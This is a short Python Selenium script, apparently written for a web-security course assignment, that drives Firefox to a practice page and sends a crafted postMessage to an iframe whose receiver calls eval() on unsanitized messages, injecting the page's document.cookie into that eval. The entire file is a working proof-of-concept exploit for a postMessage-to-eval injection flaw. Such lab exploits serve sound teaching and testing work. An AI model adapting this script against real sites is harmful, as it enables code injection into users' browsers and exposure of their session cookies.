from selenium import webdriver
from selenium.webdriver.common.keys import Keys

# Exploit: receiver frame using the postMessage API does improper
# sanitization of message before calling eval() on it

def main():
    driver = webdriver.Firefox()
    driver.get("http://www.wsb.com/Assignment2/case16/controller.php")
    driver.execute_script("receiver = document.getElementById('receiver').contentWindow;")
    driver.execute_script('receiver.postMessage("\\""+document.cookie+"\\"", "https://www.wsb.com/Assignment2/case16/receiver.php")')

if __name__ == "__main__":
    main()
